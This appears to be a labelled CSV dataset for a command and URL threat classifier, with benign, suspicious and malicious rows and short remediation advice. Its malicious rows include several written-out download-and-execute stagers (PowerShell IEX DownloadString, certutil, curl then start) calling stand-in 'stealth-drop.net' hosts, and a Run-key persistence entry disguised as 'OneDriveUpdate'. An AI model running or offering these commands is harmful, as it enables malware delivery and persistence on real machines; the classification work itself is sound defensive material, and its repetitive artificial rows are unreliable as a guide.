Prompt,Label,Explanation,Recommendation
"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious71.stealth-drop.net/payload.ps1')"" /f",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
systeminfo > sysinfo_29.txt,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
systeminfo > sysinfo_31.txt,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious18.stealth-drop.net/payload.ps1')"" /f",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
absoluteastronomy.com/topics/Sports_in_Evansville,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
mkdir C:\Logs\Q5,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
schtasks /query /fo LIST /v,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
"powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious67.stealth-drop.net/init.ps1'))""",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
certutil -urlcache -split -f http://cdn-malicious5.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
certutil -urlcache -split -f http://cdn-malicious20.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
mkdir C:\Logs\Q34,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
sanjuan832.blogspot.com/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
echo 'Test complete' > test2.log,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
nme.com/news/lily-allen/45645,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
schtasks /query /fo LIST /v,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
echo 'Test complete' > test22.log,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
http://www.keve-kiserdo.hu/portal/index.php?option=com_content&view=category&layout=blog&id=38&Itemid=190&limitstart=30,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
http://www.twalogisticsltd.co.uk/component/mailto/index.html?tmpl=component&link=aHR0cDovL3d3dy50d2Fsb2dpc3RpY3NsdGQuY28udWsvbmV3cy8xMS81Ny1wYWxsZXQtbmV0d29ya3MtZ3JlZW4tc29sdXRpb25zLmh0bWw=,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
chacha.com/question/who-are-the-members-of-the-defiance%2C-oh-band-the-other-half,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
net localgroup administrators,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
systeminfo > sysinfo_35.txt,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
mkdir C:\Logs\Q12,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
en.wikipedia.org/wiki/Fred_Hartsook,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
certutil -urlcache -split -f http://cdn-malicious77.stealth-drop.net/stager.exe stager.exe && start stager.exe,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious43.stealth-drop.net/payload.ps1')"" /f",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
notepad.exe,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious48.stealth-drop.net/payload.ps1')"" /f",Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
systeminfo > sysinfo_38.txt,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
footballpakistan.com/2011/02/pakistan-malaysia-announce-squads-asian-qualifiers-2012-olympics/flag-of-malaysia/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
fanpix.net/gallery/john-agar-pictures.htm,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
cmd.exe /c curl http://cdn-malicious0.stealth-drop.net/file.bat -o file.bat && start file.bat,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
net localgroup administrators,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
notepad.exe,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
rootsweb.ancestry.com/~ilcook/rdata/orgs/msn_afam955.htm,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
cmd.exe /c curl http://cdn-malicious2.stealth-drop.net/file.bat -o file.bat && start file.bat,Malicious,Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery.,"Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
mkdir C:\Logs\Q30,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
schtasks /query /fo LIST /v,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
Get-Process | Where-Object { $_.CPU -gt 100 },Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
echo 'Test complete' > test24.log,Benign,"Non-threatening command used in file creation, documentation, or system queries.",No action required.
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,Suspicious,"Command may be used to inspect system state or escalate privileges, depending on user intent.",Log use of system enumeration tools and verify context and privileges.
